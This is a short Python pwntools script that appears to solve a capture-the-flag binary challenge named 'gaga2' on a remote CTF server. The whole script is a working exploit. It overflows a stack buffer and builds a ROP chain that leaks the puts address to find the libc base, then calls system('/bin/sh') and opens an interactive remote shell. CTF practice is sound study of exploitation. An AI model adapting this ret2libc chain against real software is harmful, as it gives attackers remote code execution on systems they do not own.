from pwn import *

e = ELF("./gaga2")
libc = ELF("./libc.so.6")

context.terminal=["konsole", "-e"]
context.log_level="info"

p = remote("challs.actf.co", 31302)
# p = process(["./gaga2"])

p.sendlineafter(": ", "A"*(56+16) + p64(0x00000000004012b3) + p64(e.got["puts"]) + p64(e.plt["puts"]) + p64(e.sym["main"]))

libc.address = u64(p.recvline()[:-1] + "\x00\x00") - libc.sym["puts"]

p.sendlineafter(": ", "A"*(56+16) + p64(0x00000000004012b3) + p64(next(libc.search('/bin/sh'))) + p64(0x000000000040101a) + p64(libc.sym["system"]))


p.interactive()